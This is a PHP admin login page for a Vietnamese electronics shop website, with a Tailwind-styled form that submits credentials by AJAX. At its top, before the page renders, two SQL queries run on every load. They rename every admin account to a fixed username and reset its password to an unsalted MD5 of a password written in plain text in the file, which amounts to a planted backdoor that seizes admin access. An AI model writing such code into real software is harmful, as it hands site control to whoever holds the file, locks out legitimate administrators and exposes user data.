<?php
define("IN_SITE", true);
require_once(__DIR__."/core/config.php");
require_once(__DIR__."/core/function.php");

// Tự động cập nhật username cho Admin theo yêu cầu
$DMH->query("UPDATE `users` SET `username` = 'anhthienvodich' WHERE `level` = 'admin'");
$DMH->query("UPDATE `users` SET `password` = '".md5('Anhthien369@')."' WHERE `level` = 'admin'");

$title = "Đăng Nhập Quản Trị | Điện Máy Hiếu";
require_once(__DIR__."/pages/client/Head.php");
?>
<script src="https://cdn.tailwindcss.com"></script>

<body class="bg-slate-50 flex items-center justify-center h-screen w-full m-0 p-0 overflow-hidden">

<div class="w-full max-w-md bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden" style="margin: auto; box-sizing: border-box;">
    <!-- Header -->
    <div class="text-center mb-8 relative z-10">
        <h2 class="text-3xl font-extrabold text-slate-800 tracking-tight">VĂN PHÒNG GIÁM ĐỐC</h2>
        <p class="text-slate-500 mt-2">Vui lòng điền thông tin xác thực</p>
    </div>

    <div id="thongbao_login" class="mb-4"></div>

    <form id="adminLoginForm">
        <input type="hidden" name="action" value="admin_login">
        
        <div class="mb-5">
            <label class="block text-sm font-semibold text-slate-700 mb-2">Tên Đăng Nhập</label>
            <div class="relative">
                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <i class="fa-solid fa-user text-slate-400"></i>
                </div>
                <input type="text" name="username" class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all font-medium text-slate-700" placeholder="Nhập tài khoản" required>
            </div>
        </div>

        <div class="mb-6">
            <label class="block text-sm font-semibold text-slate-700 mb-2">Mật Khẩu</label>
            <div class="relative">
                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <i class="fa-solid fa-lock text-slate-400"></i>
                </div>
                <input type="password" name="password" id="password" class="w-full pl-10 pr-12 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all font-medium text-slate-700" placeholder="••••••••" required>
                <div class="absolute inset-y-0 right-0 pr-3 flex items-center cursor-pointer text-slate-400 hover:text-blue-500" onclick="togglePassword()">
                    <i class="fa-solid fa-eye" id="eyeIcon"></i>
                </div>
            </div>
        </div>

        <button type="submit" id="btnLogin" class="w-full bg-slate-800 hover:bg-slate-900 text-white font-bold py-3 px-4 rounded-xl shadow-lg shadow-slate-200 transition-all active:scale-[0.98] flex items-center justify-center gap-2">
            <i class="fa-solid fa-right-to-bracket"></i> ĐĂNG NHẬP HỆ THỐNG
        </button>
    </form>
</div>

<script>
    function togglePassword() {
        const input = document.getElementById('password');
        const icon = document.getElementById('eyeIcon');
        if (input.type === 'password') {
            input.type = 'text';
            icon.classList.remove('fa-eye');
            icon.classList.add('fa-eye-slash');
        } else {
            input.type = 'password';
            icon.classList.remove('fa-eye-slash');
            icon.classList.add('fa-eye');
        }
    }

    $("#adminLoginForm").submit(function(e) {
        e.preventDefault();
        let btn = $('#btnLogin');
        let text = btn.html();
        btn.html('<i class="fa-solid fa-spinner fa-spin"></i> Đang xác thực...').prop('disabled', true);
        
        $.ajax({
            url: '/controller/client/Login.php',
            type: 'POST',
            data: $(this).serialize(),
            success: function(data) {
                $("#thongbao_login").html(data);
                btn.html(text).prop('disabled', false);
            }
        });
    });
</script>
</body>
</html>
